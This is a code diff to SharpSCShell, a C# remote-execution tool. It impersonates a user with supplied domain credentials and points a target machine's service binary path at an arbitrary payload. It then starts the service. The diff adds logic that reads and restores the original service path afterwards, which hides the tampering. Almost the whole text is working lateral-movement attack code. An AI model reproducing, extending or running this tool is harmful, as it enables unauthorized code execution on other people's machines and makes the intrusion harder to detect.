@@ -8,7 +8,6 @@ namespace SharpSCshell
 {
     class Program
     {
-        #region 登陆模拟模块 LogonUser + ImpersonateLoggedOnUser
         [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal static extern bool LogonUser(
@@ -21,9 +20,8 @@ namespace SharpSCshell
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
-        #endregion
 
-        #region 服务控制管理器模块 
+
         [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
         public static extern IntPtr OpenSCManager(
             string lpMachineName, 
@@ -35,6 +33,14 @@ namespace SharpSCshell
             IntPtr hSCManager, 
             string lpServiceName, 
             uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll",
+            SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern int QueryServiceConfig(
+            IntPtr service,
+            IntPtr queryServiceConfig,
+            int bufferSize,
+            ref int bytesNeeded);
 
         [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -117,14 +123,31 @@ namespace SharpSCshell
                               SERVICE_INTERROGATE |
                               SERVICE_USER_DEFINED_CONTROL)
         }
+        private struct QueryServiceConfigStruct
+        {
+            public int serviceType;
+            public int startType;
+            public int errorControl;
+            public IntPtr binaryPathName;
+            public IntPtr loadOrderGroup;
+            public int tagID;
+            public IntPtr dependencies;
+            public IntPtr startName;
+            public IntPtr displayName;
+        }
 
-        #endregion
 
         [DllImport("kernel32.dll")]
         public static extern uint GetLastError();
 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
+
         static void Main(string[] args)
         {
+            Console.WriteLine();
+            Console.WriteLine("=============== SharpSCShell --> Revised at Rcoil (C# version) =============== ");
+            Console.WriteLine();
             if (args.Length < 2)
             {
                 Console.WriteLine("SharpSCShell.exe target service payload domain username password");
@@ -143,6 +166,7 @@ namespace SharpSCshell
             const int SERVICE_DEMAND_START = 0x00000003;
             const int SERVICE_ERROR_IGNORE = 0x00000000;
             IntPtr phToken = IntPtr.Zero;
+            int bytesNeeded = 5;
 
             Console.WriteLine("[*] Trying to connect to {0}", target);
             bool bResult = false;
@@ -156,7 +180,6 @@ namespace SharpSCshell
                     Environment.Exit(0);
                 }
             }
-
             bResult = ImpersonateLoggedOnUser(phToken);
             if (!bResult)
             {
@@ -164,7 +187,6 @@ namespace SharpSCshell
                 Environment.Exit(0);
             }
 
-            //Pass in Null/nothing as the database name to use the default SERVICES_ACTIVE_DATABASE
             IntPtr SCMHandle = OpenSCManager(target, null, (uint)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);
             if (SCMHandle == IntPtr.Zero)
             {
@@ -176,13 +198,37 @@ namespace SharpSCshell
             Console.WriteLine("[*] Opening {0} Service ....", ServiceName);
             IntPtr schService = OpenService(SCMHandle, ServiceName, ((uint)SERVICE_ACCESS.SERVICE_ALL_ACCESS));
             Console.WriteLine("[*] SC_HANDLE Service 0x{0}", schService);
+
+            
+            QueryServiceConfigStruct qscs = new QueryServiceConfigStruct();
+            IntPtr qscPtr = Marshal.AllocCoTaskMem(0);
+            int retCode = QueryServiceConfig(schService, qscPtr, 0, ref bytesNeeded);
+            if (retCode == 0 && bytesNeeded == 0)
+            {
+                Console.WriteLine("[!] QueryServiceConfig failed to read the service path. Error:{0}", GetLastError());
+            }
+            else
+            {
+                Console.WriteLine("[*] LPQUERY_SERVICE_CONFIGA need {0} bytes", bytesNeeded);
+                qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);
+                retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, ref bytesNeeded);
+                qscs.binaryPathName = IntPtr.Zero;
+
+                qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, new QueryServiceConfigStruct().GetType());
+            }
+
+            string originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);
+            Console.WriteLine("[*] Original service binary path \"{0}\"", originalBinaryPath);
+            Marshal.FreeCoTaskMem(qscPtr);
+
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, null, null, null, null, null, null);
             if (!bResult)
             {
                 Console.WriteLine("[!] ChangeServiceConfigA failed to update the service path. Error:{0}", GetLastError());
                 Environment.Exit(0);
             }
-            Console.WriteLine("[*] Service path was changed to {0}", payload);
+            Console.WriteLine("[*] Service path was changed to \"{0}\"", payload);
+
 
             bResult = StartService(schService, 0, null);
             uint dwResult = GetLastError();
@@ -194,6 +240,16 @@ namespace SharpSCshell
             else
             {
                 Console.WriteLine("[*] Service was started");
+            }
+            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, null, null, null, null, null, null);
+            if (!bResult)
+            {
+                Console.WriteLine("[!] ChangeServiceConfigA failed to revert the service path. Error:{0}", GetLastError());
+                Environment.Exit(0);
+            }
+            else
+            {
+                Console.WriteLine("[*] Service path was restored to \"{0}\"", originalBinaryPath);
             }
         }
     }
